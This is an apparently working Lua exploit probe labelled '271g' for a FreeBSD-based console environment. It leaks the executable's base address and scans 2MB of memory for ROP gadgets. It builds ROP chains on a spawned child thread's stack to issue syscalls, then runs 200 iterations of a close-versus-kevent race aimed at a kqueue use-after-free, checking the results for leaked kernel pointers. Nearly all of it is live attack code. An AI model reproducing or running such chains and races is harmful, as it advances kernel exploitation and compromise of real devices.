-- CRASH_CLASS: HIGH
-- PROBE 271g: Child thread ROP syscalls + kqueue close race
--
-- Context: Child threads (thr_new 455) can only run one gadget — no syscall
-- access. But if we control the child's stack, we can ROP after start_func
-- returns: pop rax (=syscall_no), then jump to fn_addr (syscall stub).
--
-- With that, we test a kqueue UAF race: main thread in kevent(), child thread
-- does close(monitored_fd). If knote_fdclose races with kevent processing,
-- we may get stale data (kptrs) or a crash (confirming the bug).
--
-- CRITICAL: fn_addr is in libkernel (XO) — do NOT read from it.

print("=== PROBE 271g: child ROP + kqueue race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
print("fn_addr=" .. fmt_addr(stub))

local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- [A] Get eboot base
print("")
print("[A] eboot base")
local info = memory.alloc(0x200)
wd(N(info), 0x160)
local sc593 = mk(593)
pcall(function() sc593(uint64(0), info) end)
local eboot_lo = rd(N(info) + 0x108)
local eboot_hi = rd(N(info) + 0x10C)
if not eboot_lo or not eboot_hi then print("ABORT: no eboot base"); return end
local eboot_base = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
print("eboot=" .. fmt_addr(eboot_base))

-- [B] Gadget scan — search full 2MB for ROP gadgets
print("")
print("[B] gadget scan (2MB)")

local pop_rax_ret = nil       -- 58 C3
local pop_rdi_ret = nil       -- 5F C3
local pop_rdi_rbp_ret = nil   -- 5F 5D C3
local xor_edi_ret = nil       -- 31 FF C3
local bare_ret = nil          -- C3
local scan_base = N(eboot_base)
local scan_limit = 0x200000   -- 2MB

for off = 0, scan_limit - 4, 4 do
    local d = rd(scan_base + off)
    if not d then break end

    local b0 = d % 256
    local b1 = math.floor(d / 256) % 256
    local b2 = math.floor(d / 65536) % 256
    local b3 = math.floor(d / 16777216) % 256

    -- bare ret (C3)
    if not bare_ret then
        if b0 == 0xC3 then bare_ret = off
        elseif b1 == 0xC3 then bare_ret = off + 1
        elseif b2 == 0xC3 then bare_ret = off + 2
        elseif b3 == 0xC3 then bare_ret = off + 3 end
    end

    -- pop rax; ret (58 C3)
    if not pop_rax_ret then
        if b0 == 0x58 and b1 == 0xC3 then pop_rax_ret = off
        elseif b1 == 0x58 and b2 == 0xC3 then pop_rax_ret = off + 1
        elseif b2 == 0x58 and b3 == 0xC3 then pop_rax_ret = off + 2 end
    end

    -- pop rdi; ret (5F C3)
    if not pop_rdi_ret then
        if b0 == 0x5F and b1 == 0xC3 then pop_rdi_ret = off
        elseif b1 == 0x5F and b2 == 0xC3 then pop_rdi_ret = off + 1
        elseif b2 == 0x5F and b3 == 0xC3 then pop_rdi_ret = off + 2 end
    end

    -- pop rdi; pop rbp; ret (5F 5D C3) — fallback
    if not pop_rdi_rbp_ret then
        if b0 == 0x5F and b1 == 0x5D and b2 == 0xC3 then pop_rdi_rbp_ret = off
        elseif b1 == 0x5F and b2 == 0x5D and b3 == 0xC3 then pop_rdi_rbp_ret = off + 1 end
    end

    -- xor edi,edi; ret (31 FF C3) — sets rdi=0
    if not xor_edi_ret then
        if b0 == 0x31 and b1 == 0xFF and b2 == 0xC3 then xor_edi_ret = off
        elseif b1 == 0x31 and b2 == 0xFF and b3 == 0xC3 then xor_edi_ret = off + 1 end
    end

    -- Also check cross-dword boundary for 2-byte patterns
    if off + 4 < scan_limit then
        local d2 = rd(scan_base + off + 4)
        if d2 then
            local nb0 = d2 % 256
            if b3 == 0x58 and nb0 == 0xC3 and not pop_rax_ret then pop_rax_ret = off + 3 end
            if b3 == 0x5F and nb0 == 0xC3 and not pop_rdi_ret then pop_rdi_ret = off + 3 end
            if b3 == 0x5F and nb0 == 0x5D and not pop_rdi_rbp_ret then
                local nb1 = math.floor(d2 / 256) % 256
                if nb1 == 0xC3 then pop_rdi_rbp_ret = off + 3 end
            end
            if b2 == 0x5F and b3 == 0x5D and nb0 == 0xC3 and not pop_rdi_rbp_ret then
                pop_rdi_rbp_ret = off + 2
            end
        end
    end

    if pop_rax_ret and pop_rdi_ret and bare_ret then break end
    if pop_rax_ret and (pop_rdi_ret or pop_rdi_rbp_ret or xor_edi_ret) and bare_ret then break end
end

print(string.format("  pop_rax_ret:     %s", pop_rax_ret and string.format("eboot+0x%X", pop_rax_ret) or "NOT FOUND"))
print(string.format("  pop_rdi_ret:     %s", pop_rdi_ret and string.format("eboot+0x%X", pop_rdi_ret) or "NOT FOUND"))
print(string.format("  pop_rdi_rbp_ret: %s", pop_rdi_rbp_ret and string.format("eboot+0x%X", pop_rdi_rbp_ret) or "NOT FOUND"))
print(string.format("  xor_edi_ret:     %s", xor_edi_ret and string.format("eboot+0x%X", xor_edi_ret) or "NOT FOUND"))
print(string.format("  bare_ret:        %s", bare_ret and string.format("eboot+0x%X", bare_ret) or "NOT FOUND"))

if not pop_rax_ret then print("ABORT: need pop_rax_ret"); return end
if not bare_ret then print("ABORT: need bare_ret"); return end

local g_pop_rax_ret = eboot_base + pop_rax_ret
local g_bare_ret = eboot_base + bare_ret

-- Determine best rdi-setting gadget and build the thr_exit ROP chain shape
-- If pop_rdi_ret: [pop_rdi_ret] [0] [pop_rax_ret] [431] [fn_addr]
-- If pop_rdi_rbp_ret: [pop_rdi_rbp_ret] [0] [dummy_rbp] [pop_rax_ret] [431] [fn_addr]
-- If xor_edi_ret: [xor_edi_ret] [pop_rax_ret] [431] [fn_addr]
-- If none: skip thr_exit, ignore SIGSEGV, let child crash after close

local exit_chain = {}
local has_exit = false

if pop_rdi_ret then
    local g = eboot_base + pop_rdi_ret
    exit_chain = {g, uint64(0), g_pop_rax_ret, uint64(431), stub}
    has_exit = true
    print("  exit strategy: pop_rdi_ret")
elseif xor_edi_ret then
    local g = eboot_base + xor_edi_ret
    exit_chain = {g, g_pop_rax_ret, uint64(431), stub}
    has_exit = true
    print("  exit strategy: xor_edi_ret")
elseif pop_rdi_rbp_ret then
    local g = eboot_base + pop_rdi_rbp_ret
    exit_chain = {g, uint64(0), uint64(0), g_pop_rax_ret, uint64(431), stub}
    has_exit = true
    print("  exit strategy: pop_rdi_rbp_ret")
else
    print("  exit strategy: NONE (will ignore SIGSEGV)")
    -- Ignore SIGSEGV (11) before spawning threads
    local sc416 = mk(416)
    local sigact = memory.alloc(0x20)
    local sa = N(sigact)
    wq(sa, uint64(1))     -- SIG_IGN = 1
    wd(sa + 8, 0)         -- sa_flags = 0
    wq(sa + 16, uint64(0)) -- sa_mask = 0
    pcall(function() sc416(uint64(11), sigact, uint64(0)) end)
    print("  SIGSEGV ignored")
end

if not alive() then print("DEAD after gadget scan"); return end

-- [C] Test child thread close via ROP
print("")
print("[C] test child thread ROP close")

local sc_socket = mk(97)
local sc_close = mk(6)
local sc_thr_new = mk(455)

-- Create test socket
local ok_s, sock = pcall(function()
    return sc_socket(uint64(2), uint64(2), uint64(0))
end)
local test_fd = ok_s and N(sock) or -1
print("test socket fd=" .. test_fd)
if test_fd < 0 then print("ABORT: no socket"); return end

-- Allocate stack + ROP area (extra space above nominal stack top)
local stack_mem = memory.alloc(0x8000)
local stack_base = N(stack_mem)
local stack_size = 0x4000
local rsp = stack_base + stack_size - 8

-- Write close ROP chain:
-- [RSP+0]  = pop_rax_ret
-- [RSP+8]  = 6 (SYS_close)
-- [RSP+16] = fn_addr (syscall;ret → close(rdi=fd))
-- [RSP+24..] = exit chain (thr_exit or crash)
local function write_rop(fd_val)
    wq(rsp,      g_pop_rax_ret)
    wq(rsp + 8,  uint64(6))
    wq(rsp + 16, stub)
    -- Write exit chain
    for i, v in ipairs(exit_chain) do
        wq(rsp + 16 + i * 8, v)
    end
    if not has_exit then
        -- Fill rest with bare_ret to slide to crash gracefully
        for i = 1, 8 do wq(rsp + 24 + (i-1) * 8, g_bare_ret) end
    end
end

write_rop(test_fd)

-- Build thr_param struct
local param = memory.alloc(0x40)
local pa = N(param)
for i = 0, 0x3C, 4 do wd(pa + i, 0) end
wq(pa + 0x00, g_bare_ret)
wq(pa + 0x08, uint64(test_fd))
wq(pa + 0x10, uint64(stack_base))
wq(pa + 0x18, uint64(stack_size))
local child_tid = memory.alloc(8)
wq(N(child_tid), uint64(0))
wq(pa + 0x30, child_tid)

print("spawning child to close fd " .. test_fd .. "...")
local ok_t, rv_t = pcall(function() return sc_thr_new(param, uint64(0x38)) end)
local thr_ret = ok_t and N(rv_t) or -999
print("thr_new ret=" .. thr_ret)

if thr_ret ~= 0 then
    print("ABORT: thr_new failed")
    pcall(function() sc_close(uint64(test_fd)) end)
    return
end

local tid = rd(N(child_tid))
print("child tid=" .. (tid or "nil"))

-- Wait for child to run
for i = 1, 5000 do local _ = rd(stack_base) end

-- Check if socket was closed by child
local ok_c, rv_c = pcall(function() return sc_close(uint64(test_fd)) end)
local close_ret = ok_c and N(rv_c) or -999
if close_ret == -1 then
    print("*** CHILD ROP CLOSE CONFIRMED: fd already closed (ret=-1) ***")
elseif close_ret == 0 then
    print("child close did NOT work: main thread closed it (ret=0)")
else
    print("close returned " .. close_ret)
end

if not alive() then print("DEAD after ROP test"); return end

-- [D] Kqueue race: concurrent close + kevent
print("")
print("[D] kqueue close race (200 iterations)")

local sc_kqueue = mk(362)
local sc_kevent = mk(363)

local ok_kq, kq_rv = pcall(function() return sc_kqueue() end)
local kq_fd = ok_kq and N(kq_rv) or -1
print("kqueue fd=" .. kq_fd)
if kq_fd < 0 then print("ABORT: no kqueue"); return end

local changelist = memory.alloc(0x40)
local eventlist = memory.alloc(0x200)
local timeout = memory.alloc(0x10)
local ca = N(changelist)
local ea = N(eventlist)
local ta = N(timeout)
wq(ta, uint64(0))
wq(ta + 8, uint64(1000000))  -- 1ms

local races = 0
local anomalies = 0
local events_seen = 0

for iter = 1, 200 do
    if not alive() then
        print("DEAD at iter " .. iter)
        break
    end

    local ok_sk, sk_rv = pcall(function()
        return sc_socket(uint64(2), uint64(2), uint64(0))
    end)
    local sock_fd = ok_sk and N(sk_rv) or -1
    if sock_fd < 0 then
        print("iter " .. iter .. ": socket fail")
        break
    end

    -- Register EVFILT_READ on socket
    wq(ca, uint64(sock_fd))
    wd(ca + 8, 0x0001FFFF)  -- filter=-1(EVFILT_READ), flags=EV_ADD(1)
    wd(ca + 12, 0)
    wq(ca + 16, uint64(0))
    wq(ca + 24, uint64(0xDEAD0000 + iter))

    pcall(function()
        sc_kevent(uint64(kq_fd), changelist, uint64(1), uint64(0), uint64(0), uint64(0))
    end)

    -- Sentinel fill eventlist
    for off = 0, 0x1FC, 4 do wd(ea + off, 0xDEAD0000 + iter) end

    -- Prepare child ROP for close(sock_fd)
    write_rop(sock_fd)
    wq(pa + 0x08, uint64(sock_fd))
    wq(N(child_tid), uint64(0))

    -- RACE: spawn child (close), then immediately kevent
    pcall(function() sc_thr_new(param, uint64(0x38)) end)

    local ok_ev, ev_rv = pcall(function()
        return sc_kevent(uint64(kq_fd), uint64(0), uint64(0), eventlist, uint64(8), timeout)
    end)
    local nev = ok_ev and N(ev_rv) or -999

    races = races + 1

    if nev > 0 then
        events_seen = events_seen + nev
        for ei = 0, nev - 1 do
            local bo = ei * 32
            local id_lo = rd(ea + bo) or 0
            local id_hi = rd(ea + bo + 4) or 0
            local fl = rd(ea + bo + 8) or 0
            local ffl = rd(ea + bo + 12) or 0
            local dt_lo = rd(ea + bo + 16) or 0
            local dt_hi = rd(ea + bo + 20) or 0
            local ud_lo = rd(ea + bo + 24) or 0
            local ud_hi = rd(ea + bo + 28) or 0

            local function check_kptr(name, hi, lo)
                local uhi = hi; if uhi < 0 then uhi = uhi + 0x100000000 end
                if uhi >= 0xFFFF8000 and uhi < 0xFFFFFFFF then
                    anomalies = anomalies + 1
                    print(string.format("  *** KPTR iter=%d ev=%d %s=0x%08X%08X ***",
                        iter, ei, name, hi, lo))
                    return true
                end
                return false
            end

            local any = check_kptr("ident", id_hi, id_lo)
            any = check_kptr("data", dt_hi, dt_lo) or any
            any = check_kptr("udata", ud_hi, ud_lo) or any

            -- Check stale ident (not our sock_fd)
            if id_hi == 0 and id_lo ~= sock_fd then
                anomalies = anomalies + 1
                any = true
                print(string.format("  *** STALE iter=%d ev=%d ident=%d expected=%d ***",
                    iter, ei, id_lo, sock_fd))
            end

            if any then
                print(string.format("    dump: id=%08X%08X fl=%08X ffl=%08X dt=%08X%08X ud=%08X%08X",
                    id_hi, id_lo, fl, ffl, dt_hi, dt_lo, ud_hi, ud_lo))
            end
        end
    elseif nev == -999 then
        anomalies = anomalies + 1
        print(string.format("  iter=%d kevent PCALL-FAIL", iter))
    end

    -- Wait for child
    for w = 1, 300 do local _ = rd(stack_base) end

    pcall(function() sc_close(uint64(sock_fd)) end)

    if iter % 50 == 0 then
        print(string.format("  progress: iter=%d races=%d ev=%d anom=%d alive=%s",
            iter, races, events_seen, anomalies, alive() and "yes" or "NO"))
    end
end

pcall(function() sc_close(uint64(kq_fd)) end)

print("")
print(string.format("RESULT: races=%d events=%d anomalies=%d", races, events_seen, anomalies))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 271g COMPLETE ===")
